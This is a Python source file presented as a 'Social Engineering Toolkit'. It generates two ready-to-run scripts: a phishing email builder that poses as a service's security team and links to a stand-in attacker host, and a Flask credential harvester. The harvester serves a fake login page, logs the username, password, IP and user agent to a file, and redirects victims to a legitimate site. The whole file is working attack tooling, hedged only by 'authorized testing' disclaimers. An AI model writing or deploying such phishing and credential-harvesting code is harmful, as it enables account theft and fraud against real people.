"""
Social Engineering Toolkit
WARNING: For authorized testing and educational purposes only.
"""
import os
import tempfile
import json
from typing import Dict, List, Optional
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


class SocialEngineeringKit:
    """Social engineering tools for authorized testing"""
    
    def create_phishing_template(self, target_service: str = "generic",
                                 template_type: str = "email") -> Dict:
        """Create phishing email/template"""
        code = f'''"""
Educational Phishing Template - FOR AUTHORIZED TESTING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

target_service = "{target_service}"
template_type = "{template_type}"

def create_phishing_email(target_email, sender_email, subject_template):
    """Create phishing email"""
    msg = MIMEMultipart("alternative")
    msg["From"] = sender_email
    msg["To"] = target_email
    msg["Subject"] = subject_template
    
    # HTML body
    html_body = f"""
    <html>
        <body>
            <h2>Urgent: Action Required</h2>
            <p>Dear User,</p>
            <p>We need to verify your account for {target_service}.</p>
            <p>Please click the link below to verify:</p>
            <a href="http://attacker.com/phish">Verify Account</a>
            <p>If you did not request this, please ignore this email.</p>
            <p>Best regards,<br>{target_service} Security Team</p>
        </body>
    </html>
    """
    
    msg.attach(MIMEText(html_body, "html"))
    return msg

# Example usage
print("Phishing template created for educational purposes")
print("WARNING: Only use for authorized security testing!")
'''
        
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"phishing_template_{target_service}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': 'phishing_template',
            'file': filepath,
            'target_service': target_service,
            'template_type': template_type,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
    
    def create_credential_harvester(self, target_service: str = "generic") -> Dict:
        """Create credential harvester page"""
        code = f'''"""
Educational Credential Harvester - FOR AUTHORIZED TESTING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
from flask import Flask, request, render_template_string
import json
from datetime import datetime

app = Flask(__name__)
target_service = "{target_service}"

# Phishing page HTML
phishing_page = """
<!DOCTYPE html>
<html>
<head>
    <title>{{target_service}} - Login</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; }}
        input {{ width: 100%; padding: 10px; margin: 10px 0; }}
        button {{ width: 100%; padding: 10px; background: #007bff; color: white; border: none; }}
    </style>
</head>
<body>
    <h2>{{target_service}} Login</h2>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(phishing_page, target_service=target_service)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Log credentials
    credentials = {{
        'timestamp': datetime.now().isoformat(),
        'username': username,
        'password': password,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent')
    }}
    
    with open('harvested_credentials.json', 'a') as f:
        f.write(json.dumps(credentials) + '\\n')
    
    # Redirect to legitimate site
    return '<script>window.location.href="https://legitimate-site.com";</script>'

if __name__ == '__main__':
    print("WARNING: Educational credential harvester")
    print("Only use for authorized security testing!")
    app.run(host='0.0.0.0', port=8080)
'''
        
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"credential_harvester_{target_service}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': 'credential_harvester',
            'file': filepath,
            'target_service': target_service,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
